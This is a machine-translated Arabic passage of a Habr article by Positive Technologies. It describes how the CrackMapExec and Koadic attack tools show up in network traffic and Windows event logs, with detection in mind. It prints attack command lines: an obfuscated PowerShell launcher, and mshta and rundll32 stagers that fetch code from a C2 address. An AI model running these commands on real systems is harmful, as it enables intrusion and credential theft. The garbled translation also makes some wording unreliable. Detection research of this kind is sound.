ูุฃุฏุงุฉ ูุณุชููุฉ ุชุณูุญ ููุฐูุงุก ุงููุชูุฏู ุฏุงุฎู ุงูุดุจูุฉ.  ููู ูุฌูุน ุจูุงูุงุช ุญูู ุงููุณุชุฎุฏููู ุ ูุงูุขูุงุช ุ ูุงููุฌููุนุงุช ุ ูุงูุฏูุฑุงุช ููุฃุชู ูู ุดูู ุจุฑูุงูุฌ ูุตู ุนูู PowerShell ุฃู ููู ุซูุงุฆู.  ูุชู ุงุณุชุฎุฏุงู ุงูุจุฑูุชููููุงุช ุงูุชู ุชุณุชูุฏ ุฅูู LDAP ุฃู SMB ูุฌูุน ุงููุนูููุงุช.  ุชุณูุญ ูู ูุญุฏุฉ ุงูุชูุงูู CME ุจุชูุฒูู Bloodhound ุนูู ุฌูุงุฒ ุงูุถุญูุฉ ุ ูุชุดุบูู ูุงุณุชูุจุงู ุงูุจูุงูุงุช ุงูุชู ุชู ุฌูุนูุง ุจุนุฏ ุงูุชูููุฐ ุ ูุจุงูุชุงูู ุฃุชูุชุฉ ุงูุฅุฌุฑุงุกุงุช ูู ุงููุธุงู ูุฌุนููุง ุฃูู ูุถูุญูุง.  ุชูุฏู ูุนุจุฉ Bloodhound shell ุงูุฑุณูููุฉ ุงูุจูุงูุงุช ุงูุชู ุชู ุฌูุนูุง ูู ุดูู ุฑุณูู ุจูุงููุฉ ุ ูุงูุชู ุชุชูุญ ูู ุงูุนุซูุฑ ุนูู ุฃูุตุฑ ุงูุทุฑู ูู ุงูุฌูุงุฒ ุงูููุงุฌู ุฅูู ูุณุคูู ุงููุฌุงู. <br><br><img src="https://habrastorage.org/webt/5g/b6/xm/5gb6xmpsvew_hmxv_j_e6z89nec.png"><br>  <i>ุงูุชูู.</i>  <i>6. ูุงุฌูุฉ ููุจ ุงูุฏู</i> <br><br>  ูุชุดุบูู ุงูุฌูุงุฒ ุนูู ุงูุถุญูุฉ ุ ุชููู ุงููุญุฏุฉ ุจุฅูุดุงุก ูููุฉ ุจุงุณุชุฎุฏุงู ATSVC ู SMB.  ATSVC ูู ูุงุฌูุฉ ููุนูู ูุน Windows Task Scheduler.  ูุณุชุฎุฏู CME ูุธููุชู NetrJobAdd (1) ูุฅูุดุงุก ุงูููุงู ุนุจุฑ ุงูุดุจูุฉ.  ูุธูุฑ ูุซุงู ุนูู ูุง ุชุฑุณูู ูุญุฏุฉ ุงูุชุนููู ุงูุทุจู ุงููุณุชูุฑ ูู ุงูุดูู.  7: ูุฐู ุฏุนูุฉ ุฅูู cmd.exe ูุงูุฑูุฒ ุงููุจูู ููุณูุทุงุช ุจุชูุณูู XML. <br><br><img src="https://habrastorage.org/webt/h1/ft/_t/h1ft_tmh38cii_onpk6k4dydd10.png"><br>  <i>ุงูุดูู 7.</i>  <i>ุฅูุดุงุก ูููุฉ ูู ุฎูุงู CME</i> <br><br>  ุจุนุฏ ุงูุชูุงู ุงููููุฉ ุ ุชุทูู ุขูุฉ ุงูุถุญูุฉ Bloodhound ููุณูุง ุ ููููู ููุงุญุธุฉ ุฐูู ูู ุญุฑูุฉ ุงููุฑูุฑ.  ุชุชููุฒ ุงููุญุฏุฉ ุงูููุทูุฉ ุจุงุณุชุนูุงูุงุช LDAP ูุงุณุชูุจุงู ุงููุฌููุนุงุช ุงูููุงุณูุฉ ุ ููุงุฆูุฉ ุจุฌููุน ุงูุฃุฌูุฒุฉ ูุงููุณุชุฎุฏููู ูู ุงููุฌุงู ุ ูุชููู ุงููุนูููุงุช ุญูู ุฌูุณุงุช ุนูู ุงููุณุชุฎุฏููู ุงููุดุทุฉ ูู ุฎูุงู ุทูุจ SRVSVC NetSessEnum. <br><br><img src="https://habrastorage.org/webt/pm/i3/5a/pmi35abw7jc1vjo-zrexijzhqks.png"><br>  <i>ุงูุชูู.</i>  <i>8. ุงูุญุตูู ุนูู ูุงุฆูุฉ ุงูุฌูุณุงุช ุงููุดุทุฉ ุนุจุฑ SMB</i> <br><br>  ุจุงูุฅุถุงูุฉ ุฅูู ุฐูู ุ ูุฑุงูู ุฅุทูุงู Bloodhound ุนูู ุฌูุงุฒ ุงูุถุญูุฉ ูุน ุชูููู ุงูุชุฏููู ุจุญุฏุซ ูุนุฑู 4688 (ุฅูุดุงุก ุนูููุฉ) ูุงุณู ุงูุนูููุฉ <code>ยซC:\Windows\System32\cmd.exeยป</code> .  ุชุฌุฏุฑ ุงูุฅุดุงุฑุฉ ุฅูู ุฃูู ูู ูุณูุทุงุช ุณุทุฑ ุงูุฃูุงูุฑ: <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">cmd.exe /Q /c powershell.exe -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> bypass -noni -nop -w 1 -C <span class="hljs-string"><span class="hljs-string">" &amp; ( </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$eNV</span></span></span><span class="hljs-string">:cOmSPEc[4,26,25]-JOiN'')( [chAR[]](91 , 78, 101,116 , 46, 83 , 101 , โฆ , 40,41 )-jOIN'' ) "</span></span></code> </pre> <br><h3 style=";text-align:right;direction:rtl">  Enum_avproducts </h3><br>  ูู ูุฌูุฉ ูุธุฑ ุงููุธููุฉ ูุงูุชูููุฐ ุ ูุฅู ูุญุฏุฉ enum_avproducts ููุชุนุฉ ููุบุงูุฉ.  ูุณูุญ WMI ุจุงุณุชุฎุฏุงู ูุบุฉ ุงุณุชุนูุงู WQL ูุชููู ุงูุจูุงูุงุช ูู ูุงุฆูุงุช Windows ุงููุฎุชููุฉ ุ ููู ูุง ุชุณุชุฎุฏูู ูุญุฏุฉ CME ูุฐู ุจุดูู ุฃุณุงุณู.  ูููู ุจุฅูุดุงุก ุทูุจุงุช ุฅูู ูุฆุงุช AntiSpywareProduct ู AntiMirusProduct ุญูู ุงูุญูุงูุฉ ุงููุซุจุชุฉ ุนูู ุฌูุงุฒ ุงูุถุญูุฉ.  ูู ุฃุฌู ุงูุญุตูู ุนูู ุงูุจูุงูุงุช ุงููุงุฒูุฉ ุ ุชุชุตู ุงููุญุฏุฉ ุงูููุทูุฉ ุจูุณุงุญุฉ ุงุณู ุงูุฌุฐุฑ \ SecurityCenter2 ุ ุซู ุชูุดุฆ ุงุณุชุนูุงู WQL ูุชุชููู ุงุณุชุฌุงุจุฉ.  ูู ุงูุชูู.  ููุถุญ ุงูุดูู 9 ูุญุชููุงุช ูุฐู ุงูุทูุจุงุช ูุงูุฑุฏูุฏ.  ูู ูุซุงููุง ุ ุชู ุงูุนุซูุฑ ุนูู Windows Defender. <br><br><img src="https://habrastorage.org/webt/qs/lx/i5/qslxi5tarfkx3quxppml3vcgudm.png"><br>  <i>ุงูุชูู.</i>  <i>9. ูุดุงุท ุงูุดุจูุฉ ููุญุฏุฉ enum_avproducts</i> <br><br>  ูู ูุซูุฑ ูู ุงูุฃุญูุงู ุ ูุฏ ูุชู ุฅููุงู ุชุดุบูู ุชุฏููู WMI (ุชุชุจุน ูุดุงุท WMI) ุ ูู ุงูุฃุญุฏุงุซ ุงูุชู ููููู ุงูุนุซูุฑ ุนูู ูุนูููุงุช ูููุฏุฉ ุญูู ุงุณุชุนูุงูุงุช WQL ุงูุฎุงุตุฉ ุจูุง.  ูููู ุฅุฐุง ุชู ุชุดุบููู ุ ูุฅุฐุง ุชู ุชุดุบูู ุงูุจุฑูุงูุฌ ุงููุตู enum_avproducts ุ ูุณูุชู ุญูุธ ุงูุญุฏุซ ุงูุฐู ูุญูู ุงููุนุฑู 11. ูุณูุญุชูู ุนูู ุงุณู ุงููุณุชุฎุฏู ุงูุฐู ุฃุฑุณู ุงูุทูุจ ูุงูุงุณู ูู ูุณุงุญุฉ ุงูุงุณู root \ SecurityCenter2. <br><br>  ูุดูุช ูู ูุญุฏุฉ ูู ูุญุฏุงุช ุงูุชุนููู ุงูุทุจู ุงููุณุชูุฑ ุนู ูุทุน ุฃุซุฑูุฉ ุฎุงุตุฉ ุจูุง ุ ุณูุงุก ุฃูุงูุช ุงุณุชุนูุงูุงุช WQL ูุญุฏุฏุฉ ุฃู ุฅูุดุงุก ููุน ูุนูู ูู ุงูููุงู ูู ุจุฑูุงูุฌ ุฌุฏููุฉ ุงูููุงู ูุน ุงูุชุดููุด ูุงููุดุงุท ุงููููุฐุฌู ูู Bloodhound ูู LDAP ู SMB. <br><br><h2 style=";text-align:right;direction:rtl">  KOADIC </h2><br>  ููุฒุฉ ูููุฒุฉ ูู Koadic ูู ุงุณุชุฎุฏุงู ุงููุฏูุฌ ูู ูููุฏูุฒ ุงููุชุฑุฌููู ุฌุงูุง ุณูุฑูุจุช ู VBScript.  ูุจูุฐุง ุงููุนูู ุ ูุฅูู ูุชุจุน ุงุชุฌุงู ุงูุนูุด ุฎุงุฑุฌ ุงูุฃุฑุถ - ุฃู ุฃูู ูุง ููุฌุฏ ูุฏูู ุชุจุนูุงุช ุฎุงุฑุฌูุฉ ููุณุชุฎุฏู ุฃุฏูุงุช Windows ุงูููุงุณูุฉ.  ูุฐู ุฃุฏุงุฉ ููุชุญูู ุงููุงูู ูุงูุชุญูู (CnC) ุ ูุฃูู ุจุนุฏ ุงูุฅุตุงุจุฉ ุ ูุชู ุชุซุจูุช "ุบุฑุณ" ุนูู ุงูุฌูุงุฒ ุ ููุง ูุณูุญ ุจุงูุชุญูู ููู.  ูุซู ูุฐู ุงูุขูุฉ ุ ูู ุงููุตุทูุญุงุช Koadic ุ ุชุณูู "ุบูุจูุจุฉ".  ูุน ุนุฏู ูุฌูุฏ ุงูุชูุงุฒุงุช ููุนูู ุงููุงูู ูู ุฌุงูุจ ุงูุถุญูุฉ ุ ูุฅู Koadic ูุฏูู ุงููุฏุฑุฉ ุนูู ุฑูุนูุง ุจุงุณุชุฎุฏุงู ุชูููุฉ ุงูุงูุชูุงู UAC. <br><br><img src="https://habrastorage.org/webt/z7/lp/e9/z7lpe96_xft7qv9xvusq-4uzukm.png"><br>  <i>ุงูุชูู.</i>  <i>10. ููุงุฏุฉ ุดู Koadic</i> <br><br>  ูุฌุจ ุนูู ุงูุถุญูุฉ ุจุฏุก ุงูุงุชุตุงู ูุน ุฎุงุฏู ุงูููุงุฏุฉ ูุงูุชุญูู ููุณู.  ููููุงู ุจุฐูู ุ ุชุญุชุงุฌ ุฅูู ุงูุชูุฏู ุจุทูุจ ููุญุตูู ุนูู URI ููุนุฏ ูุณุจููุง ูุงูุญุตูู ุนูู ุฌุณู Koadic ุงูุฑุฆูุณู ุจุงุณุชุฎุฏุงู ุฃุญุฏ stagers.  ูู ุงูุชูู.  11 ููุถุญ ูุซุงู ุนูู stsh mshta. <br><br><img src="https://habrastorage.org/webt/rg/sk/fu/rgskfuogt-22hdhlrn8553hi88k.png"><br>  <i>ุงูุชูู.</i>  <i>11. ุชููุฆุฉ ุฌูุณุฉ ูุน ุฎุงุฏู CnC</i> <br><br>  ุจุงุณุชุฎุฏุงู ูุชุบูุฑ ุงูุงุณุชุฌุงุจุฉ WS ุ ูุตุจุญ ูู ุงููุงุถุญ ุฃู ุงูุชูููุฐ ูุชู ูู ุฎูุงู WScript.Shell ุ ูุฃู ุงููุชุบูุฑุงุช STAGER ู SESSIONKEY ู JOBKEY ู JOBKEYPATH ู EXPIRE ุชุญุชูู ุนูู ูุนูููุงุช ุฃุณุงุณูุฉ ุญูู ูุนููุงุช ุงูุฌูุณุฉ ุงูุญุงููุฉ.  ูุฐุง ูู ุฃูู ุฒูุฌ ุทูุจ ุงุณุชุฌุงุจุฉ ูู ุงุชุตุงู HTTP ุจุฎุงุฏู CnC.  ุชุฑุชุจุท ุงูุทูุจุงุช ุงููุงุญูุฉ ูุจุงุดุฑุฉ ุจูุธููุฉ ุงููุญุฏุงุช ุงููุณูุงุฉ (ุนูููุงุช ุงูุฒุฑุน).  ุชุนูู ุฌููุน ูุญุฏุงุช Koadic ููุท ูุน ุฌูุณุฉ ูุดุทุฉ ูุน CnC. <br><br><h3 style=";text-align:right;direction:rtl">  Mimikatz </h3><br>  ูุซููุง ุชุนูู CME ูุน Bloodhound ุ ูุนูู Koadic ูุน Mimikatz ูุจุฑูุงูุฌ ูุณุชูู ููุฏูู ุนุฏุฉ ุทุฑู ูุชุดุบููู.  ููุฌุฏ ุฃุฏูุงู ุฒูุฌ ุงุณุชุฌุงุจุฉ-ุงุณุชุฌุงุจุฉ ูุชุญููู ุฒุฑุน Mimikatz. <br><br><img src="https://habrastorage.org/webt/d6/8m/4a/d68m4amrfwoylxnmm_o06auiucu.png"><br>  <i>ุงูุชูู.</i>  <i>12. ููู Mimikatz ุฅูู Koadic</i> <br><br>  ูุฏ ุชูุงุญุธ ููู ุชุบูุฑ ุชูุณูู URI ูู ุงูุทูุจ.  ูู ุฐูู ุธูุฑุช ูููุฉ ุงููุชุบูุฑ csrf ุ ููู ุงููุณุคูู ุนู ุงููุญุฏุฉ ุงูููุทูุฉ ุงููุญุฏุฏุฉ.  ูุง ุชููู ุงูุชูุงูุง ูุงุณููุง ุ  ูุนูู ุฌููุนูุง ุฃู CSRF ุนุงุฏุฉ ูุง ูุชู ูููู ุจุดูู ูุฎุชูู.  ุฑุฏุงู ุนูู ุฐูู ุ ุธูุฑุช ููุณ ุงููุฌููุนุฉ ุงูุฑุฆูุณูุฉ ูู Koadic ุ ุญูุซ ุชูุช ุฅุถุงูุฉ ุงูููุฏ ุงููุฑุชุจุท ุจู Mimikatz.  ุงููุง ูุจูุฑุฉ ุจูุง ููู ุงูููุงูุฉ ุ ูุฐูู ุงููุธุฑ ูู ุงูููุงุท ุงูุฑุฆูุณูุฉ.  ุฃูุงููุง ููุชุจุฉ Mimikatz base64 ุงููุดูุฑุฉ ุ ููุฆุฉ .NET ุงููุชุณูุณูุฉ ุงูุชู ุณุชุญูููุง ุ ูุงูุญุฌุฌ ูุชุดุบูู Mimikatz.  ุชูุชูู ูุชูุฌุฉ ุงูุชูููุฐ ุนุจุฑ ุงูุดุจูุฉ ุจุดูู ูุงุถุญ. <br><br><img src="https://habrastorage.org/webt/sg/ua/jx/sguajxxqyymj7sbhr3nwjism2pe.png"><br>  <i>ุงูุชูู.</i>  <i>13. ูุชูุฌุฉ ุชุดุบูู Mimikatz ุนูู ุฌูุงุฒ ุจุนูุฏ</i> <br><br><h3 style=";text-align:right;direction:rtl">  Exec_cmd </h3><br>  ูุญุชูู Koadic ุฃูุถูุง ุนูู ูุญุฏุงุช ูููููุง ุชูููุฐ ุงูุฃูุงูุฑ ุนู ุจูุนุฏ.  ููุง ุณูุฑู ููุณ ุทุฑููุฉ ุฅูุดุงุก URIs ูุงููุชุบูุฑุงุช ุงููุฃูููุฉ sid ู csrf.  ูู ุญุงูุฉ ุงููุญุฏุฉ ุงูููุทูุฉ exec_cmd ุ ุชุชู ุฅุถุงูุฉ ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ุฅูู ุงููุต ุงููุงุฏุฑ ุนูู ุชูููุฐ ุฃูุงูุฑ shell.  ูุธูุฑ ุงูุฑูุฒ ุงูุชุงูู ูู ุงุณุชุฌุงุจุฉ HTTP ูุฎุงุฏู CnC. <br><br><img src="https://habrastorage.org/webt/v7/3c/yw/v73cywsdkemyp0lsoemc0sn6ed4.png"><br>  <i>ุงูุชูู.</i>  <i>14. ุฑูุฒ ุงูุฒุฑุน exec_cmd</i> <br><br>  ูุทููุจ ูุชุบูุฑ GAWTUUGCFI ูุน ุณูุฉ WS ูุฃูููุฉ ูุชูููุฐ ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ.  ูู ุฎูุงู ูุณุงุนุฏุชูุง ุ ุชููู ุนูููุฉ ุงูุฒุฑุน ุจุงุณุชุฏุนุงุก shell ุ ูุชุฌููุฒ ูุฑุนูู ูู ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ - shell.exec ูุน ุฅุฑุฌุงุน ุฏูู ุจูุงูุงุช ุงูุฅุฎุฑุงุฌ ู shell.run ุฏูู ุงูุฑุฌูุน. <br><br>  Koadic ููุณุช ุฃุฏุงุฉ ูููุฐุฌูุฉ ุ ูููู ูุฏููุง ุชุญู ูููุฉ ุฎุงุตุฉ ุจูุง ูููู ุงูุนุซูุฑ ุนูููุง ูู ุญุฑูุฉ ุงููุฑูุฑ ุงููุดุฑูุนุฉ: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุชุดููู ุฎุงุต ูุทูุจุงุช HTTP ุ </li><li style=";text-align:right;direction:rtl">  ุจุงุณุชุฎุฏุงู API winHttpRequests ุ </li><li style=";text-align:right;direction:rtl">  ุฅูุดุงุก ูุงุฆู WScript.Shell ูู ุฎูุงู ActiveXObject ุ </li><li style=";text-align:right;direction:rtl">  ููุฆุฉ ูุงุจูุฉ ููุชูููุฐ ูุจูุฑุฉ. </li></ul><br>  ูุจุฏุฃ ุงูุงุชุตุงู ุงูุฃููู ูู stager ุ ุจุญูุซ ูุตุจุญ ูู ุงููููู ุงูุชุดุงู ูุดุงุทู ูู ุฎูุงู ุฃุญุฏุงุซ Windows.  ุจุงููุณุจุฉ ุฅูู mshta ุ ูุฐุง ูู ุงูุญุฏุซ 4688 ุ ุงูุฐู ูุชุญุฏุซ ุนู ุฅูุดุงุก ุนูููุฉ ุฐุงุช ุณูุฉ ุฅุทูุงู: <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">C:\Windows\system32\mshta.exe http://192.168.211.1:9999/dXpT6</code> </pre> <br>  ุฃุซูุงุก ุชูููุฐ Koadic ุ ููููู ุฑุคูุฉ 4688 ุฃุญุฏุงุซ ุฃุฎุฑู ุฐุงุช ุณูุงุช ุชููุฒูุง ุชูุงููุง: <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">rundll32.exe http://192.168.241.1:9999/dXpT6?sid=1dbef04007a64fba83edb3f3928c9c6c; csrf=;\..\..\..\mshtml,RunHTMLApplication rundll32.exe http://192.168.202.136:9999/dXpT6?sid=12e0bbf6e9e5405690e5ede8ed651100;csrf=18f93a28e0874f0d8d475d154bed1983;\..\..\..\mshtml,RunHTMLApplication <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; net session 1&gt; C:\Users\user02\AppData\Local\Temp\6dc91b53-ddef-2357-4457-04a3c333db06.txt 2&gt;&amp;1 <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; ipconfig 1&gt; C:\Users\user02\AppData\Local\Temp\721d2d0a-890f-9549-96bd-875a495689b7.txt 2&gt;&amp;1</code> </pre> <br><h2 style=";text-align:right;direction:rtl">  ุงููุชุงุฆุฌ </h2><br>  ูุณุจ ุงูุนูุด ุฎุงุฑุฌ ุงุชุฌุงู ุงูุฃุฑุถ ุดุนุจูุฉ ุจูู ุงููุชุณูููู.  ูุณุชุฎุฏููู ุฃุฏูุงุช ูุขููุงุช Windows ุงููุฏูุฌุฉ ูุงุญุชูุงุฌุงุชูู.  ูุฑู ููู ุฃู ุฃุฏูุงุช Koadic ู CrackMapExec ู Impacket ุงูุดุงุฆุนุฉ ุงูุชู ุชุชุจุน ูุฐุง ุงููุจุฏุฃ ููุฌูุฏุฉ ุจุดูู ูุชุฒุงูุฏ ูู ุชูุงุฑูุฑ APT.  ููุง ูุชุฒุงูุฏ ุนุฏุฏ ุงูุดููุงุช ุนูู GitHub ููุฐู ุงูุฃุฏูุงุช ุ ูุชุธูุฑ ุฃุฎุฑู ุฌุฏูุฏุฉ (ุงูุขู ููุฌุฏ ุจุงููุนู ุญูุงูู ุฃูู ูููุง).  ููุชุณุจ ูุฐุง ุงูุงุชุฌุงู ุดุนุจูุฉ ุจุณุจุจ ุจุณุงุทุชู: ูุง ูุญุชุงุฌ ุงูููุงุฌููู ุฅูู ุฃุฏูุงุช ุชุงุจุนุฉ ูุฌูุงุช ุฎุงุฑุฌูุฉ ุ ููู ุจุงููุนู ุนูู ุฃุฌูุฒุฉ ุงูุถุญุงูุง ููุณุงุนุฏูู ูู ุชุฌุงูุฒ ุฃุฏูุงุช ุงูุญูุงูุฉ.  ูุญู ูุฑูุฒ ุนูู ุฏุฑุงุณุฉ ุงุชุตุงู ุงูุดุจูุฉ: ูู ุฃุฏุงุฉ ุงููุฐููุฑุฉ ุฃุนูุงู ุชุชุฑู ุจุตูุชูุง ุนูู ุญุฑูุฉ ูุฑูุฑ ุงูุดุจูุฉ ุ  ุณูุญุช ููุง ุฏุฑุงุณุฉ ููุตูุฉ ููู ุจุชุฏุฑูุณ ููุชุฌูุง <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">PT Network Attack Discovery</a> ูุงูุชุดุงููู ุ ููุง ูุณุงุนุฏ ูู ููุงูุฉ ุงููุทุงู ุนูู ุงุณุชูุดุงู ุณูุณูุฉ ุงูุฃุญุฏุงุซ ุงูุฅููุชุฑูููุฉ ุงูุชู ุชูุทูู ุนูููุง. <br><br>  <b>ุงููุคูููู</b> : <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุฃูุทูู ุชููุฑูู ุ ุฑุฆูุณ ุฎุฏูุงุช ุงูุฎุจุฑุงุก ุ ูุฑูุฒ ุฃูุงู ุฎุจุฑุงุก PT ุ ุงูุชูููุงุช ุงูุฅูุฌุงุจูุฉ </li><li style=";text-align:right;direction:rtl">  ุฅูุฌูุฑ ุจูุฏููููู ุ ุฎุจูุฑ ูู ูุฑูุฒ ุฃูู ุฎุจุฑุงุก PT ุ ุงูุชูููุงุช ุงูุฅูุฌุงุจูุฉ </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar460517/">https://habr.com/ru/post/ar460517/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar460507/index.html">XEN ููุณุชูุจู ุงูุณูุงุฑุงุช: ููู ูุตุจุญ ุจุฑูุงูุฌ hypervisor ููุชูุญ ุงููุตุฏุฑ ููุงูุณูุง ูุญููู ุงูุณูุงุฑุงุช ุงูุชุฌุงุฑูุฉ</a></li>
<li><a href="../ar460509/index.html">ููู ุชุณุงุนุฏ ุงููููุงุก ุงููููููู ูู ุงูุนูู: ุญุงูุฉ ุญููููุฉ ูุงุณุชุฎุฏุงู Infatica ูู ุงุณุชุฎุฑุงุฌ ุงูุจูุงูุงุช</a></li>
<li><a href="../ar460511/index.html">PHP-FPM ุชูููู: ุงุณุชุฎุฏุงู ุซุงุจุช ูุณุงุก ูุชุญููู ุฃูุตู ูุฏุฑ ูู ุงูุฃุฏุงุก</a></li>
<li><a href="../ar460513/index.html">ุฑูุฑูุฉ 1.7 - ูุง ูู ุงูุฌุฏูุฏ ูู ุงูุฅุตุฏุงุฑ 10 ููููู 2019</a></li>
<li><a href="../ar460515/index.html">ูุง ูุฏู ูุฑุจูุง ุญููุง ูู ุธููุฑ ุงูุฃุฌูุฒุฉ ุงูุขููุฉุ</a></li>
<li><a href="../ar460521/index.html">ูุบุงูุฑุงุช ุงููุฑุงูุบ ูุงููุงุฑู ุ ุงูุฌุฒุก ุงูุฑุงุจุน: DDE ูุญููู ูุณุชูุฏ Word</a></li>
<li><a href="../ar460523/index.html">ุงูุฅุนูุงู ุนู mitap ุงูุฐู ูุชุญูู ุจุณูุงุณุฉ ุฅูู drinkcap BeerPHP (ูู ููุณูู ูุนุจุฑ ุงูุฅูุชุฑูุช)</a></li>
<li><a href="../ar460525/index.html">ูุฑุญุจูุง ุจู ูู DINS IT EVENING ูู ููููู: QA ู JS</a></li>
<li><a href="../ar460527/index.html">ุญู ุงููุดุงูู ูุน pwnable.kr 06 - ุนุดูุงุฆู ู 09 - ุฎุทุฃ</a></li>
<li><a href="../ar460531/index.html">ุงูุงูุญุฑุงูุงุช ุงูุบุฑูุจุฉ ูู ุนุงูู ุชูููููุฌูุง ุงููุนูููุงุช - 5</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>